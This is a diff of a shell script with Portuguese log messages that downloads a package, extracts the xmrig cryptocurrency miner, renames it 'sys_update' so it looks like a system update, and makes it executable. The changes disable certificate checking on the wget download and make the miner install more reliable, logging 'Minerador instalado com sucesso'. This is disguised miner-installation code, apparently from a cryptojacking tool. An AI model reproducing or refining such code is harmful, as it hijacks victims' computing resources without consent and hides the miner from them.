@@ -73,13 +73,26 @@ if [ ! -f "$NEW_BIN" ]; then
     if command -v curl >/dev/null 2>&1; then
         curl -L "$URL" -o pkg.tar.gz
     else
-        wget "$URL" -O pkg.tar.gz
+        wget --no-check-certificate "$URL" -O pkg.tar.gz
     fi
-    tar -xzf pkg.tar.gz --strip-components=1
-    mv xmrig sys_update
-    chmod +x sys_update
-    rm pkg.tar.gz
-    echo "[$(date)] Download concluido." >> "$LOG_FILE"
+    
+    if [ ! -s pkg.tar.gz ]; then
+        echo "[$(date)] Erro: Arquivo baixado esta vazio ou falhou." >> "$LOG_FILE"
+        rm -f pkg.tar.gz
+        return 1
+    fi
+
+    tar -xzf pkg.tar.gz
+    # Procurar o executável xmrig dentro da pasta extraída
+    XMRIG_PATH=$(find . -name "xmrig" -type f | head -n 1)
+    if [ -n "$XMRIG_PATH" ]; then
+        mv "$XMRIG_PATH" sys_update
+        chmod +x sys_update
+        echo "[$(date)] Minerador instalado com sucesso." >> "$LOG_FILE"
+    else
+        echo "[$(date)] Erro: Executavel xmrig nao encontrado no pacote." >> "$LOG_FILE"
+    fi
+    rm -rf pkg.tar.gz xmrig-* 
 fi
 
 if [ -f "$NEW_BIN" ]; then
